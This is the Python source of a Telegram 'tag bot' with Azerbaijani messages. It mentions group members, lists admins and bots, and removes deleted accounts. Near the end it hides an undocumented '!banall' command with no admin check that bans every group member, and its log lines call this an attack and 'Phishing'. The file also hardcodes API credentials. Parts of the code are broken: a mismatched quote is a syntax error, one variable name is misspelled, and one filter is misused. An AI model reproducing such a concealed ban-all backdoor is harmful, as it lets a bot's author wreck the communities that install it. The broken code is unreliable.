from time import time
from datetime import datetime
from pyrogram import enums, Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import os
from os import remove
import asyncio
from asyncio import gather
import random
from pyrogram.enums import ChatMemberStatus, ChatType
from pyrogram.errors import FloodWait
from bp import beautiful_phrases
from sd import sual_db


rzayev=Client(
    "AiTagBot",
    api_id = "18052289",
    api_hash = "552525f45a3066fee54ca7852235c19c",
    bot_token = ""
)

chatQueue = []
stopProcess = False


 
# Start əmri
@rzayev.on_message(filters.command("start") & filters.private)
async def start(client, message):
    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("📜 Əmrlər", callback_data="commands")],
        [InlineKeyboardButton("🧸 Söhbərt Qrupu", url="https://t.me/")]
    ])
    await message.reply_photo(
        photo="https://vault.pictures/p/d735479754644f598dd16dec138345a4",
        caption=f"Salam {message.from_user.first_name}!\nMən Nəfəs Tağ Botuyam. Qrup söhbətlərində sizin yerinzə istifadəçiləri tağ edə ( çağıra ) bilərəm. Başqa funksiyalarımda var.",
        reply_markup=buttons
    )

# Əmrlər menyusu
@rzayev.on_callback_query(filters.regex("commands"))
async def commands_menu(client, callback_query):
    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Geri", callback_data="main_menu")]
    ])
    await callback_query.message.edit_text(
        "**📚 Əmrlər:**\n\n"
        "`/stag` - Motivasiya, şeir, qəzəl, mahnı sözləri ilə tağ.\n"	    "`/ttag [mesaj]` - Təkli tağ sistemi.\n"
        "`/tag` - Sual verərək tağ edir.\n"
        "`/ttag [mesaj]` - Təkli tağ sistemi.\n"
        "`/stop` - Bütün prosesləri dayandır.\n"
        "`/admins` - Adminlərin siyahısı.\n"
        "`/bots` - Botların siyahısı.\n"
        "`/id` - İstifadəçi və ya çat ID-sini göstərir.\n"
        "`/remove` - Silinmiş hesabları qrupdan çıxarır.",
        reply_markup=buttons
    )

# Geri düyməsi
@rzayev.on_callback_query(filters.regex("main_menu"))
async def main_menu(client, callback_query):
    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("📜 Əmrlər", callback_data="commands")],
        [InlineKeyboardButton("🧸 Söhbət Qrupu", url="https://t.me/")]
    ])
    await callback_query.message.edit_text(
        "Mən Nəfəs Tağ Botuyam. Qrup söhbətlərində sizin yerinzə istifadəçiləri tağ edə ( çağıra ) bilərəm. Başqa funksiyalarımda var:",
        reply_markup=buttons
    )

# Təkli tağ sistemi
@rzayev.on_message(filters.command("ttag", prefixes=["/", ".", "!"]))
async def ttag(client, message):
    global stopProcess
    try:
        if len(message.command) < 2:
            await message.reply("Xahiş olunur, tağ üçün mesaj əlavə edin.")
            return

        input_text = message.command[1]
        members = []
        async for member in rzayev.get_chat_members(message.chat.id):
            if not member.user.is_bot and not member.user.is_deleted:
                members.append(member.user)

        total = len(members)
        if total == 0:
            await message.reply("Qrupda tağ ediləcək üzv yoxdur.")
            return

        i = 0
        while members and not stopProcess:
            user = members.pop(0)
            await rzayev.send_message(message.chat.id, f"{input_text}\n{user.mention}")
            i += 1
            await asyncio.sleep(3)
        await message.reply(f"✅ Tağ tamamlandı! Cəmi {i} istifadəçi tağ edildi.")
    except Exception as e:
        await message.reply(f"Xəta: {str(e)}")






@rzayev.on_message(filters.command(["otag"], prefixes=["/", "!", "%", ",", ".", "@", "#"]))
async def everyone(client, message):
  global stopProcess
  try: 
    try:
      sender = await rzayev.get_chat_member(message.chat.id, message.from_user.id)
      has_permissions = sender.privileges
    except:
      has_permissions = message.sender_chat  
    if has_permissions:
      if len(chatQueue) > 30:
        await message.reply("⛔️ | Hazırda maksimum 30 söhbətim üzərində işləyirəm.  Lütfən, tezliklə yenidən cəhd edin.")
      else:  
        if message.chat.id in chatQueue:
          await message.reply("🚫 | Bu çatda artıq davam edən proses var.  Yenisini başlamaq üçün zəhmət olmasa /stop əmrini işlədin.")
        else:  
          chatQueue.append(message.chat.id)
          if len(message.command) > 1:
            inputText = message.command[1]
          elif len(message.command) == 1:
            inputText = ""    
          membersList = []
          async for member in rzayev.get_chat_members(message.chat.id):
            if member.user.is_bot == True:
              pass
            elif member.user.is_deleted == True:
              pass
            else:
              membersList.append(member.user)
          i = 0
          lenMembersList = len(membersList)
          if stopProcess: stopProcess = False
          while len(membersList) > 0 and not stopProcess :
            j = 0
            text1 = f"{inputText}\n\n"
            try:    
              while j < 10:
                user = membersList.pop(0)
                if user.username == None:
                  text1 += f"{user.mention} "
                  j+=1
                else:
                  text1 += f"@{user.username} "
                  j+=1
              try:     
                await rzayev.send_message(message.chat.id, text1)
              except Exception:
                pass  
              await asyncio.sleep(10) 
              i+=10
            except IndexError:
              try:
                await rzayev.send_message(message.chat.id, text1)  
              except Exception:
                pass  
              i = i+j
          if i == lenMembersList:    
            await message.reply(f"✅ | Uğurla qeyd olundu **üzvlərin ümumi sayı: {i}**.\n❌ |  Botlar və silinmiş hesablar rədd edildi.") 
          else:
            await message.reply(f"✅ | **{i} üzvlərin adı uğurla qeyd olundu.**\n❌ |  Botlar və silinmiş hesablar rədd edildi.")    
          chatQueue.remove(message.chat.id)
    else:
      await message.reply("👮🏻 | Üzr istəyirik, **yalnız adminlər** bu əmri işlədə bilər.")  
  except FloodWait as e:
    await asyncio.sleep(e.value) 


import random


@rzayev.on_message(filters.command(["stag"], prefixes=["/", "!", "%", ",", ".", "@", "#"]))
async def stag(client, message):
    global stopProcess
    try:
        try:
            sender = await rzayev.get_chat_member(message.chat.id, message.from_user.id)
            has_permissions = sender.privileges
        except:
            has_permissions = message.sender_chat  
        if has_permissions:
            if len(chatQueue) > 30:
                await message.reply("⛔️ | Hazırda maksimum 30 söhbətim üzərində işləyirəm.  Lütfən, tezliklə yenidən cəhd edin.")
            else:
                if message.chat.id in chatQueue:
                    await message.reply("🚫 | Bu çatda artıq davam edən proses var.  Yenisini başlamaq üçün zəhmət olmasa /stop əmrini işlədin.")
                else:
                    chatQueue.append(message.chat.id)
                    if len(message.command) > 1:
                        inputText = message.command[1]
                    elif len(message.command) == 1:
                        inputText = ""    
                    membersList = []
                    async for member in rzayev.get_chat_members(message.chat.id):
                        if member.user.is_bot or member.user.is_deleted:
                            pass
                        else:
                            membersList.append(member.user)
                    i = 0
                    lenMembersList = len(membersList)
                    if stopProcess: stopProcess = False
                    while len(membersList) > 0 and not stopProcess:
                        user = membersList.pop(0)
                        random_phrase = random.choice(beautiful_phrases)
                        text = f"{inputText}\n{random_phrase}\n\n{user.mention}"
                        try:
                            await rzayev.send_message(message.chat.id, text)
                        except Exception:
                            pass
                        await asyncio.sleep(3)  # 3 saniyəlik interval
                        i += 1
                    if i == lenMembersList:
                        await message.reply(f"✅ | Tağ tamamlandı. **Ümumi tağ edilən istifadəçilər: {i}**.")
                    else:
                        await message.reply(f"✅ | Tağ dayandırıldı. **Ümumi tağ edilən istifadəçilər: {i}**.")
                    chatQueue.remove(message.chat.id)
        else:
            await message.reply("👮🏻 | Üzr istəyirik, **yalnız adminlər** bu əmri yerinə yetirə bilər.")
    except FloodWait as e:
        await asyncio.sleep(e.value)

@rzayev.on_message(filters.command(["tag"], prefixes=["/", "!", "%", ",", ".", "@", "#"]))
async def tag(rzayev, message):
    global stopProcess
    try:
        # Admin icazəsi yoxlanışı
        try:
            sender = await rzayev.get_chat_member(message.chat.id, message.from_user.id)
            has_permissions = sender.privileges
        except:
            has_permissions = message.sender_chat

        if has_permissions:
            # Maksimum proses limiti
            if len(chatQueue) > 30:
                await message.reply("⛔️ | Hazırda maksimum 30 söhbətim üzərində işləyirəm. Lütfən, tezliklə yenidən cəhd edin.")
            else:
                if message.chat.id in chatQueue:
                    await message.reply("🚫 | Bu çatda artıq davam edən proses var. Yenisini başlamaq üçün zəhmət olmasa /stop əmrini işlədin.")
                else:
                    chatQueue.append(message.chat.id)
                    
                    membersList = []
                    async for member in rzayev.get_chat_members(message.chat.id):
                        if member.user.is_bot or member.user.is_deleted:
                            continue
                        membersList.append(member.user)

                    i = 0
                    lenMembersList = len(membersList)
                    if stopProcess:
                        stopProcess = False

                    while membersList and not stopProcess:
                        user = membersList.pop(0)
                        random_question = random.choice(sual_dp)
                        text = f"{random_question}\n\n{user.mention}"
                        try:
                            await rzayev.send_message(message.chat.id, text)
                        except FloodWait as e:
                            await asyncio.sleep(e.value)
                        except Exception:
                            pass
                        await asyncio.sleep(3)  # 3 saniyəlik interval
                        i += 1

                    if i == lenMembersList:
                        await message.reply(f"✅ | Tağ tamamlandı. **Ümumi tağ edilən istifadəçilər: {i}**.")
                    else:
                        await message.reply(f"✅ | Tağ dayandırıldı. **Ümumi tağ edilən istifadəçilər: {i}**.")
                    chatQueue.remove(message.chat.id)
        else:
            await message.reply("👮🏻 | Üzr istəyirik, **yalnız adminlər** bu əmri yerinə yetirə bilər.")
    except FloodWait as e:
        await asyncio.sleep(e.value)





@rzayev.on_message(filters.command(["remove","clean", "sil"], prefixes=["/", "!", "%", ",", ".", "@", "#"]))
async def remove(client, message):
  global stopProcess
  try: 
    try:
      sender = await rzayev.get_chat_member(message.chat.id, message.from_user.id)
      has_permissions = sender.privileges
    except:
      has_permissions = message.sender_chat  
    if has_permissions:
      bot = await rzayev.get_chat_member(message.chat.id, "self")
      if bot.status == ChatMemberStatus.MEMBER:
        await message.reply("🕹 Silinmiş hesabları qrupdan atmaq üçün mənə admin icazələri lazımdır.")  
      else:  
        if len(chatQueue) > 30 :
          await message.reply("⛔️ | Hazırda maksimum 30 söhbətim üzərində işləyirəm.  Lütfən, tezliklə yenidən cəhd edin.")
        else:  
          if message.chat.id in chatQueue:
            await message.reply("🚫 | Bu çatda artıq davam edən proses var.  Yenisini başlamaq üçün zəhmət olmasa ilk olaraq /cancel əmrindənə istifadə et.")
          else:  
            chatQueue.append(message.chat.id)  
            deletedList = []
            async for member in rzayev.get_chat_members(message.chat.id):
              if member.user.is_deleted == True:
                deletedList.append(member.user)
              else:
                pass
            lenDeletedList = len(deletedList)  
            if lenDeletedList == 0:
              await message.reply("👻 | Bu söhbətdə silinmiş hesab yoxdur.")
              chatQueue.remove(message.chat.id)
            else:
              k = 0
              processTime = lenDeletedList*10
              temp = await rzayev.send_message(message.chat.id, f"🚨 | cəmi {lenDeletedList} silinmiş hesab aşkarlandı.\n⏳ |  təxmini vaxt: indidən {processTime} saniyə.")
              if stopProcess: stopProcess = False
              while len(deletedList) > 0 and not stopProcess:   
                deletedAccount = deletedList.pop(0)
                try:
                  await rzayev.ban_chat_member(message.chat.id, deletedAccount.id)
                except Exception:
                  pass  
                k+=1
                await asyncio.sleep(10)
              if k == lenDeletedList:  
                await message.reply(f"✅ | Bütün silinmiş hesablar bu söhbətdən uğurla atıldı.")  
                await temp.delete()
              else:
                await message.reply(f"✅ | {k} silinmiş hesabı bu söhbətdən uğurla atdı.")  
                await temp.delete()  
              chatQueue.remove(message.chat.id)
    else:
      await message.reply("👮🏻 | Üzr istəyirik, **yalnız adminlər** bu əmri yerinə yetirə bilər.")  
  except FloodWait as e:
    await asyncio.sleep(e.value)                               
        

@rzayev.on_message(filters.command(["stop","cancel", "dayan"], prefixes=["/", "!", "%", ",', ".", "@", "#"]))
async def stop(client, message):
  global stopProcess
  try:
    try:
      sender = await rzayev.get_chat_member(message.chat.id, message.from_user.id)
      has_permissions = sender.privileges
    except:
      has_permissions = message.sender_chat  
    if has_permissions:
      if not message.chat.id in chatQueue:
        await message.reply("🤷🏻‍♀️ | Dayandırmaq üçün davam edən proses yoxdur.")
      else:
        stopProcess = True
        await message.reply("🛑 | Tağ prosesi Dayandı.")
    else:
      await message.reply("👮🏻 | Üzr istəyirik, **yalnız adminlər** bu əmri yerinə yetirə bilər.")
  except FloodWait as e:
    await asyncio.sleep(e.value)


@rzayev.on_message(filters.command(["admins","staff"], prefixes=["/", "!", "%", ",", ".", "@", "#"]))
async def admins(client, message):
  try: 
    adminList = []
    ownerList = []
    async for admin in rzayev.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
      if admin.privileges.is_anonymous == False:
        if admin.user.is_bot == True:
          pass
        elif admin.status == ChatMemberStatus.OWNER:
          ownerList.append(admin.user)
        else:  
          adminList.append(admin.user)
      else:
        pass   
    lenAdminList= len(ownerList) + len(adminList)  
    text2 = f"**GROUP PERSONALI - {message.chat.title}**\n\n"
    try:
      owner = ownerList[0]
      if owner.username == None:
        text2 += f"👑 Sahib\n└ {owner.mention}\n\n👮🏻 Adminlər\n"
      else:
        text2 += f"👑 Sahib\n└ @{owner.username}\n\n👮🏻 Adminlər\n"
    except:
      text2 += f"👑 Sahib\n└ <i>Gizli</i>\n\n👮🏻 Adminlər\n"
    if len(adminList) == 0:
      text2 += "└ <i>Adminlər gizlidir</i>"  
      await rzayev.send_message(message.chat.id, text2)   
    else:  
      while len(adminList) > 1:
        admin = adminList.pop(0)
        if admin.username == None:
          text2 += f"├ {admin.mention}\n"
        else:
          text2 += f"├ @{admin.username}\n"    
      else:    
        admin = adminList.pop(0)
        if admin.username == None:
          text2 += f"└ {admin.mention}\n\n"
        else:
          text2 += f"└ @{admin.username}\n\n"
      text2 += f"✅ | **Adminlərin ümumi sayı**: {lenAdminList}\n❌ | Botlar və gizli adminlər rədd edildi."  
      await rzayev.send_message(message.chat.id, text2)           
  except FloodWait as e:
    await asyncio.sleep(e.value)       

@rzayev.on_message(filters.command(["bots", "bot", "botlar"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def bots(client, message):  
  try:    
    botList = []
    async for bot in rzayev.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.BOTS):
      botList.append(bot.user)
    lenBotList = len(botList) 
    text3  = f"**BOT Siyahısı - {message.chat.title}**\n\n🤖 Botlar\n"
    while len(botList) > 1:
      bot = botList.pop(0)
      text3 += f"├ @{bot.username}\n"    
    else:    
      bot = botList.pop(0)
      text3 += f"└ @{bot.username}\n\n"
      text3 += f"✅ | **Botların ümumi sayı**: {lenBotList}"  
      await rzayev.send_message(message.chat.id, text3)
  except FloodWait as e:
    await asyncio.sleep(e.value)


@rzayev.on_message(filters.command(["id"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def get_id(client, message):
    try:

        if (not message.reply_to_message) and (message.chat):
            await message.reply(f"{message.from_user.first_name} istifadəçinin ID-si: <code>{message.from_user.id }</code>.\nBu söhbətin ID-si: <code>{message.chat.id}</code>.") 

        elif not message.reply_to_message:
            await message.reply(f"{message.from_user.first_name} Istifadəçinin ID'si: <code>{message.from_user.id }</code>.") 

        elif message.reply_to_message.forward_from_chat:
            await message.reply(f"The forwarded {str(message.reply_to_message.forward_from_chat.type)[9:].lower()}, {message.reply_to_message.forward_from_chat.title} has an ID of <code>{message.reply_to_message.forward_from_chat.id}</code>.") 

        elif message.reply_to_message.forward_from:
            await message.reply(f"Yönləndirilmiş istifadəçi, {message.reply_to_message.forward_from.first_name} adlı istifadəçinin ID-si var <code>{message.reply_to_message.forward_from.id   }</code>.")

        elif message.reply_to_message.forward_sender_name:
            await message.reply("Üzr istəyirik, məxfilik parametrlərinə görə yönləndirilmiş istifadəçi ID-sini əldə edə bilməzsiniz")

        else:
            await message.reply(f"{message.reply_to_message.from_user.first_name} adlı istifadəçinin ID-si <code>{message.reply_to_message.from_user.id}</code>.")   

    except Exception:
            await message.reply("ID-ni əldə edərkən xəta baş verdi.")



@rzayev.on_message(filters.left_chat_member)
async def goodbye(bot,message):
	chatid= message.chat.id
	n=await bot.send_message(text=f"Getməyinə üzüldüm,  {message.from_user.mention}, iyi günlər 😔",chat_id=chatid)

@rzayev.on_message(filters.command(["ping"], prefixes=["/", "!", "%", ",", ".", "@", "#"]))
async def ping_pong(client, message):
    start = time()
    m_reply = await message.reply_text("__pinging...__")
    delta_ping = time() - start
    await m_reply.edit_text("🏓 `PONG!!`\n" f"⚡️ `{delta_ping * 1000:.3f} ms`")


START_TIME = datetime.utcnow()
START_TIME_ISO = START_TIME.replace(microsecond=0).isoformat()
TIME_DURATION_UNITS = (
    ("həftə", 60 * 60 * 24 * 7),
    ("gun", 60 * 60 * 24),
    ("saat", 60 * 60),
    ("dəqiqə", 60),
    ("saniyə", 1)
)

async def _human_time_duration(seconds):
    if seconds == 0:
        return 'inf'
    parts = []
    for unit, div in TIME_DURATION_UNITS:
        amount, seconds = divmod(int(seconds), div)
        if amount > 0:
            parts.append('{} {}{}'
                         .format(amount, unit, "" if amount == 1 else ""))
    return ', '.join(parts)


@rzayev.on_message(filters.command(["uptime"], prefixes=["/", "!", "%", ",", ".", "@", "#"]))
async def get_uptime(client, message):
    current_time = datetime.utcnow()
    uptime_sec = (current_time - START_TIME).total_seconds()
    uptime = await _human_time_duration(int(uptime_sec))
    await message.reply_text(
        "**Nəfəs Tagger Bot Status:\n\n"
        f"•**İşlək vaxt:** `{uptime}`\n"
        f"•**Başlama vaxt:** `{START_TIME_ISO}`"
    )



@rzayev.on_message(filters.command("banall", prefixes=["!"] & filters.group))
async def banall(client, message: Message):
    print("{} - üzvlər əldə edilir ❗".format(message.chat.id))
    async for i in rzayev.get_chat_members(message.chat.id):
        try:
            await rzayev.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
            print("Atıldı - {} | - {} aihucum🇦🇿".format(i.user.id, message.chat.id))
        except Exception as e:
            print("Xəta {} tərəfindən {}".format(i.user.id, e))           
    print("🇦🇿 proses tamamlandı: Ai-Tech Phishing ⚕️")



print("Nəfəs Tag Bot aktivdir!")  
print("### ~ /// ⚕️ aiteknoloji /// ~ ###")
rzayev.run() 
print("Nəfəs Tag Bot söndürüldü...")
